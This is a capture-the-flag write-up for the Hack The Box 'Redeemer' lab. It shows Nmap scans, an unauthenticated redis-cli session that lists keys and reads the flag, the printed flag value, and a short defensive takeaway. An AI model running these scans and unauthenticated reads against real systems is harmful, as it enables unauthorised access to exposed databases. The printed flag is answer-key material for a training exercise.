# HTB Starting Point - Redeemer

**Tier:** Task 3 - Hard  
**Target IP shown in the Redis prompt:** `10.129.50.216`  
**Operating system:** Linux

## Reconnaissance

Performed a full TCP port scan using Nmap:

```bash
nmap -p- -T4 --min-rate 1000 --open -oN redeemer-full.txt 10.129.50.216
```

The scan identified port `6379/tcp` as open, running Redis.

A service scan was then performed:

```bash
nmap -sC -sV -T4 -p 6379 -oN redeemer-services.txt 10.129.50.216
```

The result identified Redis version `5.0.7`.

Port `6379` is the default Redis port. Redis is an in-memory key-value database commonly used for caching and data storage.

## Redis enumeration and flag retrieval

Connected to the Redis service using `redis-cli`:

```bash
redis-cli -h 10.129.50.216
```

Checked whether the server was responding:

```text
PING
PONG
```

Checked the number of keys stored in the current database:

```text
DBSIZE
(integer) 4
```

Listed all available keys:

```text
KEYS *
1) "flag"
2) "stor"
3) "temp"
4) "numb"
```

The `KEYS *` command revealed four stored keys. The `flag` key was then accessed:

```text
GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

The flag was retrieved directly from Redis without requiring password authentication.

The Redis session was closed using:

```text
exit
```

![Redis prompt showing the flag retrieval output](04-redeemer-flag.png)

## Flag

```text
03e1d2b376c37ab3f5319922053953eb
```

## Findings and defensive takeaway

The machine was completed by accessing an exposed Redis service without authentication and retrieving the flag from its database.

Redis instances should not be exposed publicly without appropriate security controls. Administrators should enable authentication, restrict network access, and configure firewall rules to allow only trusted clients.